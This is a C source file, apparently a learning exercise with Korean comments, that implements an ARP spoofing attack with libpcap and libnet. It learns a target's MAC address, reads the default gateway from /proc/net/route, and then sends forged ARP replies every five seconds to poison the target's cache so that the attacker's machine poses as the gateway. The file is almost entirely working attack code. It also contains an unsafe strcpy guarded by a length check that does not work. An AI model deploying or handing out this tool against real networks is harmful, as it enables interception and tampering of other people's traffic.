#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <stdint.h>
#include <pcap.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>

struct ether_addr
{
      	unsigned char ether_addr_octet[6];
};

struct ether_header
{
      	struct  ether_addr ether_dhost;
      	struct  ether_addr ether_shost;
      	unsigned short ether_type;
};

void arp_spoof();
void packet_header(unsigned char *, const struct pcap_pkthdr *, const unsigned char *);
void get_gate();
void *receive_mac();

char target_ip_addr_str[16];
u_int8_t dst_mac[6];
struct libnet_ether_addr *src_mac_addr;
u_int32_t src_ip_addr2;
unsigned int gateway;

int main(int argc, char *argv[]) 
{
	char *dev;
	char errbuf2[PCAP_ERRBUF_SIZE];
	pcap_t *pd;
	pthread_t p_thread;
	int thr_id;

	if(sizeof(argv[1])>16)
	{
		printf("too long ip address");
		exit(1);
	}
	strcpy(target_ip_addr_str,argv[1]);
	target_ip_addr_str[15]=0;
	
	//scanf("%15s", target_ip_addr_str);
	
	if(!(dev = pcap_lookupdev(errbuf2)))
	{
		perror(errbuf2);
		exit(1);
	}
        
	if((pd = pcap_open_live(dev, 1024, 1, 100, errbuf2)) == NULL) 
	{
		perror(errbuf2);
		exit(1);
	}
	
	thr_id = pthread_create(&p_thread, NULL, receive_mac, NULL);
	
	if(thr_id < 0)
	{
		perror("thread create error: ");
		exit(0);
	}
		
	if(pcap_loop(pd, -1, packet_header, 0) < 0) 
	{
		perror(pcap_geterr(pd));
		exit(1);
	}
	pcap_close(pd);
	
	pthread_detach(p_thread);
	
	return 0;
}

void get_gate()
{
	FILE *fp= fopen("/proc/net/route", "r");
	char buf[256];
	static char iface[256];
	unsigned int destination, flags, refcnt, use, metric, mask;
	int ret;

	if(fp == NULL)
	{
		printf("route open error\n");
		exit(-1);
	}
	
	while(fgets(buf, 255, fp))
	{
		if(!strncmp(buf, "Iface", 5))//실제 데이터 있는 곳까지 가기 위해
			continue;
		ret = sscanf(buf, "%s\t%x\t%x\t%d\t%d\t%d\t%d\t%x",iface, &destination, &gateway, &flags,&refcnt, &use, &metric, &mask);
		if(ret < 8)
		{
			fprintf(stderr, "read error\n");
			continue;
		}
		if(mask==0)
		{
			src_ip_addr2=gateway;
           		break;
		}
	}
	
	
}

void arp_spoof()
{
	libnet_t *l;    /* the libnet context */
        char errbuf[LIBNET_ERRBUF_SIZE];
        u_int32_t target_ip_addr;
        u_int8_t mac_zero_addr[6] = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0};
        int bytes_written;

        l = libnet_init(LIBNET_LINK, NULL, errbuf);
        if ( l == NULL ) {
                fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
                exit(EXIT_FAILURE);
        }

        /* Getting target IP address */

        target_ip_addr = libnet_name2addr4(l, target_ip_addr_str,LIBNET_DONT_RESOLVE);//입력한 문자를 ipv4의 ip 주소로 변환

        if ( target_ip_addr == -1 ) {
                fprintf(stderr, "Error converting IP address.\n");
                libnet_destroy(l);
                exit(EXIT_FAILURE);
        }

        /* Building ARP header */

        if(libnet_autobuild_arp (ARPOP_REPLY, src_mac_addr->ether_addr_octet, (u_int8_t*)(&src_ip_addr2), dst_mac, (u_int8_t*)(&target_ip_addr), l) == -1)
        {
                fprintf(stderr, "Error building ARP header: %s\n",\
                                libnet_geterror(l));
                libnet_destroy(l);
                exit(EXIT_FAILURE);
        }

        /* Building Ethernet header */

        if ( libnet_autobuild_ethernet(dst_mac, ETHERTYPE_ARP, l)== -1 )
        {
                fprintf(stderr, "Error building Ethernet header: %s\n", libnet_geterror(l));
                libnet_destroy(l);
                exit(EXIT_FAILURE);
        }

        /* Writing packet */
	
	while(1)
	{
        	bytes_written = libnet_write(l);
        	if(bytes_written != -1)
                	printf("arp send");
        	else
                	fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
		sleep(5);
	}
        libnet_destroy(l);
}

void *receive_mac(void *args)
{
	libnet_t *l;
	char errbuf[LIBNET_ERRBUF_SIZE];
	u_int32_t target_ip_addr, src_ip_addr;
	u_int8_t mac_broadcast_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	u_int8_t mac_zero_addr[6] = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0};
	int bytes_written;
	
	l = libnet_init(LIBNET_LINK, NULL, errbuf);
	if ( l == NULL ) {
		fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
		exit(EXIT_FAILURE);
	}

	src_ip_addr = libnet_get_ipaddr4(l);//내 ip주소를 가져오는 함수
	if ( src_ip_addr == -1 ) {
		fprintf(stderr, "Couldn't get own IP address: %s\n", libnet_geterror(l));
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}

	src_mac_addr = libnet_get_hwaddr(l);//장치의 mac주소를 가져오는 함수
	if ( src_mac_addr == NULL ) {
		fprintf(stderr, "Couldn't get own IP address: %s\n", libnet_geterror(l));
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}

	target_ip_addr = libnet_name2addr4(l, target_ip_addr_str, LIBNET_DONT_RESOLVE);//입력한 target의 ip 주소 문자열을 ipv4의 ip 주소로 변환

	if(target_ip_addr== -1) 
	{
		fprintf(stderr, "Error converting IP address.\n");
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}

	/* Building ARP header */

	if(libnet_autobuild_arp (ARPOP_REQUEST, src_mac_addr->ether_addr_octet, (u_int8_t*)(&src_ip_addr), mac_zero_addr, (u_int8_t*)(&target_ip_addr), l) == -1)
	{
		fprintf(stderr, "Error building ARP header: %s\n", libnet_geterror(l));
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}
	
	/* Building Ethernet header */
	
	if(libnet_autobuild_ethernet(mac_broadcast_addr, ETHERTYPE_ARP, l)== -1)
	{
		fprintf(stderr, "Error building Ethernet header: %s\n", libnet_geterror(l));
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}

	/* Writing packet */

	bytes_written = libnet_write(l);
	if(bytes_written != -1)
		printf("success receive!\n");
	else
		fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));

	libnet_destroy(l);
}

void packet_header(unsigned char *user, const struct pcap_pkthdr *h, const unsigned char *packet)
{
	struct  ether_header *eh;
	unsigned short ether_type;
	struct  ip_header *ih;
	struct  tcp_header *th;
	int offset=0;

	eh= (struct ether_header *)packet;
	ether_type=ntohs(eh->ether_type);

	//Ethernet Type=0x0800이면 IPv4 패킷, 0x0806이면 ARP 패킷
	if(ether_type!=0x0806)
	{
		return 0;
	}
	if(eh->ether_dhost.ether_addr_octet[0]==255 && eh->ether_dhost.ether_addr_octet[1]==255 && eh->ether_dhost.ether_addr_octet[2]==255 && eh->ether_dhost.ether_addr_octet[3]==255 && eh->ether_dhost.ether_addr_octet[4]==255 && eh->ether_dhost.ether_addr_octet[5]==255)
	{
		return 0;
	}
	else
	{
		dst_mac[0] = (u_int8_t)eh->ether_shost.ether_addr_octet[0];
        	dst_mac[1] = (u_int8_t)eh->ether_shost.ether_addr_octet[1];
       		dst_mac[2] = (u_int8_t)eh->ether_shost.ether_addr_octet[2];
        	dst_mac[3] = (u_int8_t)eh->ether_shost.ether_addr_octet[3];
        	dst_mac[4] = (u_int8_t)eh->ether_shost.ether_addr_octet[4];
        	dst_mac[5] = (u_int8_t)eh->ether_shost.ether_addr_octet[5];
		
        	printf("Src MAC Addr [%02x:%02x:%02x:%02x:%02x:%02x]\n", // 6 byte for src
        	eh->ether_shost.ether_addr_octet[0],
        	eh->ether_shost.ether_addr_octet[1],
        	eh->ether_shost.ether_addr_octet[2],
        	eh->ether_shost.ether_addr_octet[3],
        	eh->ether_shost.ether_addr_octet[4],
        	eh->ether_shost.ether_addr_octet[5]);
	
		get_gate();
		arp_spoof();
	
		exit(0);
	}
	return 0;
}
